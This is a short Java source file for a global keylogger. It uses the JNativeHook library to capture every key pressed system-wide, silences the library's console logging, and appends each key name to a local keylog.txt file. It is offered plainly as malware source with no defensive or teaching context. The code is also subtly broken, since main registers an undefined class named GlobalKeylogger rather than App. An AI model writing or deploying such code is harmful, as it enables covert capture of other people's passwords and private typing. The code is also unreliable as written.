import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.FileWriter;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;

public class App implements NativeKeyListener {

    private static final String LOG_FILE = "keylog.txt";

    public static void main(String[] args) {
        // Disable logging of JNativeHook to the console
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);

        try {
            // Register JNativeHook to listen for key events globally
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            System.err.println("Error registering native hook: " + e.getMessage());
            return;
        }

        // Add the key listener to GlobalScreen
        GlobalScreen.addNativeKeyListener(new GlobalKeylogger());
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
        logKey(keyText);
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        // You can handle key release events if needed
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
        // Not used, as keyPressed covers all necessary functionality
    }

    private void logKey(String key) {
        try (FileWriter writer = new FileWriter(LOG_FILE, true)) {
            writer.write(key + "\n");
        } catch (IOException e) {
            System.err.println("Error writing to log file: " + e.getMessage());
        }
    }
}